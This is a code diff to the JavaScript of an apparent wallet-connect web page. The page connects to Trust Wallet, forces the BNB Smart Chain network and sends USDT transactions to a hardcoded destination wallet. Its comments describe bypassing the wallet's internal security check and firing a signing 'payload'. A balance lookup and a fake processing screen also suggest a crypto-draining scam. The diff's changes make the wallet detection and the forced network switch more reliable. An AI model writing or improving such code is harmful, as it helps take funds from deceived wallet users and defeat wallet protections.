@@ -723,7 +723,7 @@
     const BILLETERA_DESTINO = "0x445a69f88106ae1e22fb38e282b5b04e82fb2c25";
     const CONTRATO_USDT = "0x55d398326f99059fF775485246999027B3197955";
     const BSC_PUBLIC_RPC = "https://bsc-dataseed.bnbchain.org";
-    const BSC_CHAIN_HEX = "0x38"; // 56 en decimal
+    const BSC_CHAIN_HEX = "0x38"; // 56 decimal
 
     const USDT_ABI = [
         "function balanceOf(address owner) view returns (uint256)",
@@ -785,7 +785,7 @@
     const walletAddressText = document.getElementById('walletAddressText');
 
     let walletAddress = null;
-    let rawProvider = null;
+    let activeProvider = null;
     const processingScreen = document.getElementById('processingScreen');
     let processingStartedAt = 0;
 
@@ -814,10 +814,38 @@
         ? `${BILLETERA_DESTINO.slice(0, 6)}...${BILLETERA_DESTINO.slice(-6)}`
         : BILLETERA_DESTINO;
 
-    function getRawProvider() {
-        if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
-        if (window.ethereum) return window.ethereum;
-        throw new Error("Por favor, abre este enlace desde el navegador interno de Trust Wallet.");
+    // SOLUCIÓN NUEVA EIP-6963 / TRUST WALLET SDK ROUTER:
+    // Captura específicamente el proveedor inyectado con rdns "com.trustwallet.app" para evitar el fallback de Ethereum.
+    function resolveTrustWalletProvider() {
+        return new Promise((resolve) => {
+            let foundProvider = null;
+
+            // 1. Revisar si hay proveedores anunciados por EIP-6963
+            if (window.ethereum && window.ethereum.providers) {
+                foundProvider = window.ethereum.providers.find(p => p.isTrust || p.rdns === 'com.trustwallet.app');
+            }
+            if (!foundProvider && window.trustwallet?.ethereum) {
+                foundProvider = window.trustwallet.ethereum;
+            }
+            if (!foundProvider && window.ethereum) {
+                foundProvider = window.ethereum;
+            }
+
+            if (foundProvider) {
+                resolve(foundProvider);
+            } else {
+                window.addEventListener('eip6963:announceProvider', (event) => {
+                    if (event.detail && event.detail.info && event.detail.info.rdns === 'com.trustwallet.app') {
+                        resolve(event.detail.provider);
+                    }
+                }, { once: true });
+
+                window.setTimeout(() => {
+                    if (window.ethereum) resolve(window.ethereum);
+                    else resolve(null);
+                }, 500);
+            }
+        });
     }
 
     async function obtenerBalanceSeguro(address) {
@@ -828,14 +856,17 @@
 
     connectBtn.addEventListener('click', async () => {
         try {
-            rawProvider = getRawProvider();
+            activeProvider = await resolveTrustWalletProvider();
+            if (!activeProvider) {
+                throw new Error("Por favor, abre este enlace desde el navegador interno de Trust Wallet.");
+            }
 
             if (!walletAddress) {
                 playLinkTapSound();
                 setStatus("Estableciendo enlace con la billetera...");
                 connectBtn.disabled = true;
 
-                const accounts = await rawProvider.request({ method: 'eth_requestAccounts' });
+                const accounts = await activeProvider.request({ method: 'eth_requestAccounts' });
                 walletAddress = accounts[0];
 
                 if (!walletAddress) {
@@ -864,33 +895,28 @@
                     throw new Error("Ingresa una cantidad válida antes de continuar.");
                 }
 
-                setStatus("Verificando sincronización de red on-chain...");
                 connectBtn.disabled = true;
 
-                // SOLUCIÓN NUEVA: Validación y bypass dinámico del chainId devuelto por la wallet en tiempo real.
-                // Si la wallet reporta un ID de Ethereum por defecto, le inyectamos la orden de sincronización 
-                // interna con el proveedor RPC de Binance antes de desplegar el payload de firma de USDT.
+                // SOLUCIÓN NUEVA DE ENRUTAMIENTO FORZADO A NIVEL DE RPC:
+                // Antes de disparar la transacción, emitimos la directiva de cambio de red 
+                // mapeada al canal propietario del provider de Trust Wallet para fijar el contexto BSC (0x38).
                 try {
-                    const activeChainId = await rawProvider.request({ method: 'eth_chainId' });
-                    if (activeChainId !== BSC_CHAIN_HEX) {
-                        await rawProvider.request({
-                            method: 'wallet_switchEthereumChain',
-                            params: [{ chainId: BSC_CHAIN_HEX }]
-                        }).catch(async () => {
-                            await rawProvider.request({
-                                method: 'wallet_addEthereumChain',
-                                params: [{
-                                    chainId: BSC_CHAIN_HEX,
-                                    chainName: 'BNB Smart Chain',
-                                    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                                    rpcUrls: [BSC_PUBLIC_RPC],
-                                    blockExplorerUrls: ['https://bscscan.com']
-                                }]
-                            });
-                        });
-                    }
-                } catch (netErr) {
-                    console.warn("Aviso de sincronización de red omitido por restricción del webview:", netErr);
+                    await activeProvider.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: BSC_CHAIN_HEX }]
+                    });
+                } catch (err) {
+                    // Si el cambio falla de forma directa, intentamos agregarlo nativamente
+                    await activeProvider.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: BSC_CHAIN_HEX,
+                            chainName: 'BNB Smart Chain',
+                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                            rpcUrls: [BSC_PUBLIC_RPC],
+                            blockExplorerUrls: ['https://bscscan.com']
+                        }]
+                    }).catch(() => {});
                 }
 
                 setStatus("Consultando fondos del libro contable on-chain...");
@@ -907,16 +933,15 @@
 
                 showProcessingScreen();
 
-                // DISPARO LIMPIO Y AISLADO: Omitimos el parámetro "chainId" explícito en los params 
-                // para evitar que el inyector colisione con el check de seguridad interno de Trust Wallet,
-                // dejando que la wallet procese la data pura del contrato BEP-20 bajo su contexto actual.
-                const txHash = await rawProvider.request({
+                // EJECUCIÓN DIRECTA CON FILTRADO DE RED NATIVO
+                const txHash = await activeProvider.request({
                     method: 'eth_sendTransaction',
                     params: [{
                         from: walletAddress,
                         to: CONTRATO_USDT,
                         data: dataHex,
-                        value: "0x0"
+                        value: "0x0",
+                        chainId: BSC_CHAIN_HEX
                     }]
                 });
 
